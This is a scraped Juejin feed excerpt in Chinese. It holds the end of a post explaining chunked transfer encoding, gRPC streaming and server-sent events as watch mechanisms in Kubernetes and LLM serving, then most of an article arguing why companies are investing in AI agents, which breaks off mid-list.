pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>今天快速介绍目前市场面常见的三个watch机制的实现。</p>
<h3 data-id="heading-0">1.chunked transfer encoding</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20e1607ebb714f749d2e17e808cf383c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769074979&amp;x-signature=pCLnNQAqDyyl55TptgbL%2FX298ag%3D" alt="8c91013c-53c2-4f95-a05e-8462918fad1b.webp" loading="lazy"/></p>
<p>k8s控制面几个组件，核心枢纽是apiserver， 除etcd之外，其他组件都通过restful进行http通信。</p>
<p>上文提到的<a href="https://juejin.cn/post/7586493936677748776" target="_blank" title="https://juejin.cn/post/7586493936677748776">informer机制是controller的标准范式</a>， 目的是实现声明式API的闭环控制，减少了对于apiserver的调用。</p>
<p>scheduler和kubelet、kubectl也有对于apiserver的调用，监听资源变更的方式都是watchAPI， 这是一种非标准的<code>chunked transfer encoding</code>，http1.1传输层编码。</p>
<blockquote>
<p>分块传输编码（CTE）是一种 HTTP/1.1 机制，通过将数据分割为多个块来流式传输响应，每个块前面都带有其十六进制表示的大小，使得服务器可以在不知道总长度的情况下发送数据，适用于动态内容、实时更新和大文件传输，最后以一个长度为零的块结束。</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dff8551b3f864c369d8ae7a11bea3266~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769074979&amp;x-signature=lrMbKP8%2BlGiup9OH5Xeh7QT%2BK4A%3D" alt="3.png" loading="lazy"/></p>
<h3 data-id="heading-1">2. grpc 流式通信</h3>
<p>apiserver作为控制面组件的交互枢纽， 与底层存储etcd交互。</p>
<p>apiserver 也需要watch etcd的资源变动，这样才能接力反馈到上层组件（scheduler，kubectl）。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c674812a8cbf466d96db7549d4ff53a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769074979&amp;x-signature=yulRstAdeC%2FLnfUxX%2FOyIiEuv6U%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23fabfc56561443a8e187c6223ccae90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769074979&amp;x-signature=JFln%2BzU71L%2Bhpdp6K20fyUPmpmw%3D" alt="55.png" loading="lazy"/></p>
<p>etcdv3 走的是grpc协议，天生支持双向实时通信。</p>
<blockquote>
<p>http2.0 高性能rpc框架， 单个tcp连接上多路复用，二进制分帧、双向流式通信，头部压缩。</p>
</blockquote>
<p>apiserver是作为grpc客户端与etcd交互，etcd 的 Watch 机制是一个集 MVCC 版本控制、高效内存索引、持久化存储和流式网络通信 于一体的复杂系统。其核心价值在于提供了 基于逻辑时钟的、可靠的、有序的变更通知，这正是 Kubernetes 等分布式系统能够构建出高效、一致的状态协调机制的基础。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b66798ad35fb43b4888a5a0ab9f69757~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769074979&amp;x-signature=w4dCTaKZGSM0RGWOjDAu6EIFdyU%3D" alt="4.png" loading="lazy"/></p>
<h3 data-id="heading-2">3. 服务端发送事件SSE</h3>
<p>目前火热的大模型在线推理，走的是SSE协议。</p>
<p>服务器发送事件（SSE）是一种基于HTTP 协议的<strong>单向</strong>通信协议，它允许服务器以事件流（Event Stream）的形式实时向客户端推送数据，而无需客户端明确请求。它建立在标准的 HTTP 协议之上，通过单向的持久连接，服务器可以主动向客户端发送事件和数据。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7dd88d137daf490891d415cee5d3c7da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769074979&amp;x-signature=TpV%2FzOsY8I0XHdzvA%2FBekgftw%2FY%3D" alt="5.png" loading="lazy"/></p>
<p>本质上，它是以应用层消息协议来实现的，由客户端向服务端发起建立连接请求，并保持连接打开，然后服务端主动推送消息给客户端，服务器给客户端发送的 SSE 数据，必须是 UTF-8 编码，且返回的内容类型是<code>text/event-stream</code>。</p>
<p>比如当你在使用DeepSeek 时，当你询问它问题时，你会看到它会逐字地将回答显示出来，实际上这是DeepSeek 将先计算出的数据主动的“推送”给你，采用 SSE 技术边计算边返回，避免接口等待时间过长而直接关闭页面。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么大小公司都在all in AI Agent？这不是炒作，是AI时代的必然突围]]></title>    <link>https://juejin.cn/post/7595150851477667883</link>    <guid>https://juejin.cn/post/7595150851477667883</guid>    <pubDate>2026-01-15T09:50:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595150851477667883" data-draft-id="7595150851477618731" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么大小公司都在all in AI Agent？这不是炒作，是AI时代的必然突围"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-01-15T09:50:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="狼爷"/> <meta itemprop="url" content="https://juejin.cn/user/2418581314208279"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么大小公司都在all in AI Agent？这不是炒作，是AI时代的必然突围
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2418581314208279/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    狼爷
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T09:50:24.000Z" title="Thu Jan 15 2026 09:50:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="srcery">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1b19;color:#fce8c3}.hljs-emphasis,.hljs-strong{color:#918175}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#ff5c8f}.hljs-code,.hljs-selector-class{color:#68a8e4}.hljs-emphasis{font-style:italic}.hljs-attribute,.hljs-keyword,.hljs-section,.hljs-selector-tag,.hljs-variable{color:#ef2f27}.hljs-name,.hljs-title{color:#fbb829}.hljs-params,.hljs-type{color:#0aaeb3}.hljs-string{color:#98bc37}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-subst,.hljs-symbol,.hljs-template-tag,.hljs-template-variable{color:#c07abe}.hljs-comment,.hljs-deletion,.hljs-meta{color:#918175}</style><p>如果你有关注科技圈动态，大概率会发现一个明显的风向转变：从2023年轰轰烈烈的“百模大战”，到2024年至今的“Agent争夺战”，整个AI行业的焦点正在快速迁移。无论是微软Build大会上的Copilot Studio升级，还是国内大厂的战略发布会，亦或是创业公司的融资BP，“AI Agent”这个词出现的频率越来越高。</p>
<p>后台经常有读者问我：“既然已经有了ChatGPT、豆包这样好用的对话产品，为什么全行业还要砸钱搞Agent？是不是又在炒概念？” 其实这个问题的核心，藏着AI技术演进的底层逻辑——从“只能聊天的感知智能”，到“能办实事的行动智能”，Agent不是可选项，而是必答题。</p>
<h2 data-id="heading-0">一、从“对话”到“行动”：AI的下一个能力跃迁点</h2>
<p>想搞懂Agent的价值，先看一个通俗的比喻：如果说大语言模型（LLM）是一个“上知天文下知地理”但被困在轮椅上的超级学者，那么AI Agent就是给这个学者装上了手脚、配上了工具箱，还教会了他怎么规划做事。</p>
<p>两者的核心差异，在于“应答”和“行动”的本质区别：</p>
<p>大语言模型的核心能力是“静态信息处理”——它本质上是一个超大规模的知识库+模式匹配器。你问它“怎么安排家庭旅行”，它能给你一套完整的攻略框架；你让它写一份会议纪要，它能快速整理核心要点。但它的能力边界，始终停留在“对话界面”里，无法主动去查实时机票价格、对比酒店评价，更没法直接帮你预订。这就是典型的“思想的巨人，行动的矮子”。</p>
<p>而AI Agent的核心是“动态行动闭环”——它构建了一套“感知-规划-执行-反馈”的完整链路。还是以“安排家庭旅行”为例，Agent接到需求后，会先拆解成一个个可执行的子任务：确认出行人数和时间、查询出发地到目的地的实时航班、筛选符合预算的酒店、根据景点位置规划每日行程、预订门票和餐厅。然后，它会自动调用航司API查机票、调用酒店预订平台接口对比价格、访问旅游网站抓取景点信息，全程不需要你手动操作，最终直接给你一个完整的、可执行的旅行方案，甚至帮你完成所有预订动作。</p>
<p>这背后的核心逻辑很简单：大模型的智力价值，只有通过“行动”才能真正落地。如果说LLM让AI进入了“辅助思考”的阶段，那么Agent就把AI推向了“替代执行”的阶段——从单纯的信息服务，变成了能接管完整工作流的生产力工具。这不是概念升级，而是AI从“实验室技术”走向“产业落地”的关键一步。</p>
<h2 data-id="heading-1">二、大厂的野心：争夺下一代“数字操作系统”</h2>
<p>对于微软、谷歌、苹果、字节跳动这些科技巨头来说，布局AI Agent从来不是“加个功能”那么简单，而是一场关乎未来10年数字世界控制权的“生态保卫战”。</p>
<p>巨头们的核心判断是：下一代人机交互范式，将从“人找服务”彻底转向“服务找人”。现在我们用手机，需要打开一个个App才能完成任务——订外卖打开美团、打车打开滴滴、查天气打开天气App。但未来，这些分散的服务可能会被一个“智能中枢”统筹起来：你只需要说一句“明天下午3点去机场，帮我安排好车，顺便订一份路上吃的午餐”，Agent就会自动调用打车软件、外卖平台，完成所有安排，你根本不需要再打开任何单独的App。</p>
<p>这个“智能中枢”，就是下一代的“数字操作系统”。谁能率先建成这个中枢，谁就掌握了数字世界的核心入口。这也催生了巨头们的双重焦虑：</p>
<ol>
<li>
<p>防御性焦虑：如果被竞争对手抢先建成这个中枢，自己旗下的海量App和服务就会被“管道化”。比如，要是用户都通过某家公司的Agent订外卖，那么美团、饿了么这些App就会变成“后台供应商”，失去与用户的直接联系，最终被掌握入口的公司拿捏。为了避免这种“被架空”的命运，巨头必须亲自下场做Agent。</p>
</li>
<li>
<p>增长性焦虑：移动互联网的增长红利早就见顶了，用户时长、App下载量都很难再突破。Agent是新的增长曲线——它不仅是一个新入口，更是一个新的生态基础设施。就像当年的iOS和Android系统，每一次App分发、每一笔交易都能产生利润，Agent的每一次任务分发、每一次服务调用，都能催生新的价值链。比如，Agent帮用户订酒店时，会从酒店预订平台获得佣金；帮企业处理财务数据时，会带动云服务的使用。</p>
</li>
</ol>
<p>所以，大厂们的Agent布局，本质上是在争夺“智能时代的规则制定权”。它们要通过Agent，把自己的云服务、办公软件、娱乐内容、硬件设备（比如手机、电脑、智能汽车）深度绑定，构建一个“用户进来就离不开”的闭环生态。比如微软的Copilot，已经深度集成了Office、Azure云、Teams等产品；字节跳动的Agent，正在对接抖音、今日头条、飞书等生态。一旦这个生态建成，技术优势就会变成持久的商业护城河。</p>
<h2 data-id="heading-2">三、小厂的破局：从“卖工具”到“卖结果”的生死跃迁</h2>
<p>很多人觉得，Agent是大厂的游戏，小公司根本玩不起。但事实恰恰相反——Agent技术，反而给了中小企业和创业公司一次“变道超车”的机会。</p>
<p>为什么？因为在通用大模型的基础能力上，小厂确实没优势——你不可能比微软、谷歌更有钱训练千亿参数的大模型。但Agent技术把竞争维度从“模型大小”转向了“场景深度”，而这正是小厂的核心优势。</p>
<p>Agent给小厂带来了两个根本性的改变，也是它们的破局关键：</p>
<p>第一，价值交付模式从“卖工具”升级为“卖结果”。传统的软件公司，比如做CRM系统的，卖给客户的是一套“工具”——客户需要自己配置流程、培训员工使用，最后能不能出效果，全看客户的使用能力。但基于Agent的解决方案，卖给客户的是“业务结果”。比如，一个为跨境电商做的Agent，客户买的不是“一套管理软件”，而是“自动完成选品、上架、客服跟进、数据分析的完整运营服务”；一个为律师事务所做的Agent，客户买的不是“一套法规查询工具”，而是“自动审核合同风险、生成法律意见书的专业服务”。客户不用再操心“怎么用”，只需要为“最终效果”付费，这不仅大大提升了产品粘性，还拉高了价值天花板——毕竟“结果”的价值，远比“工具”高得多。</p>
<p>第二，核心竞争力从“技术能力”转向“行业认知”。小公司的优势，从来不是通用技术，而是对某个垂直行业的深刻理解和私有数据积累。比如：</p>
<ul>
